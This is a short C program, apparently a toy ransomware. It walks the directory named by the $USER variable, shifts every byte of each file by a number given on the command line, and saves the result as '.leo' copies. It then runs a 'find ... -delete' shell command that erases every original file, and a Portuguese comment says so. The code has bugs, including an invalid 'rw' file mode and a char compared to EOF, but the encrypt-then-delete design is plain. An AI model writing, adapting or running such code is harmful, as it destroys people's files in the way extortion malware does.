/*
    https://stackoverflow.com/questions/11736060/how-to-read-all-files-in-a-folder-using-c
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <dirent.h>
#include <unistd.h>
#include <errno.h>


int main(int argc, char** argv) {
    DIR* FD;
    struct dirent* in_file;
    FILE *entry_file;
    FILE *output_file;
    char filename_to_encrypt[512];
    char new_filename[512];
    char buffer;
    char* path = getenv("USER");

    if (argc < 2) {
        printf("usage: ./%s <argument>", argv[0]);
        return 1;
    }

    int cipher = atoi(argv[1]);

    if (NULL == (FD = opendir (path))) 
    {
        fprintf(stderr, "Error : Failed to open input directory - %s\n", strerror(errno));
        return 1;
    }

    while ((in_file = readdir(FD))) 
    {
        if (!strcmp (in_file->d_name, "."))
            continue;
        if (!strcmp (in_file->d_name, ".."))
            continue;

        sprintf(filename_to_encrypt, "%s/%s", path, in_file->d_name);
        entry_file = fopen(filename_to_encrypt, "rw");
        if (entry_file == NULL)
        {
            fprintf(stderr, "Error : Failed to open %s - %s\n", filename_to_encrypt, strerror(errno));
            return 1;
        }

        sprintf(new_filename, "%s.leo", filename_to_encrypt);
        output_file = fopen(new_filename, "w");

        while ((buffer = fgetc(entry_file)) != EOF)
        {
            fprintf(output_file, "%c", (buffer + cipher));
        }

        fclose(output_file);
        fclose(entry_file);

    }

    // removendo todos arquivos que não terminam com .leo
    system("find $USER -type f ! -name '*.leo' -delete");

    return 0;
}
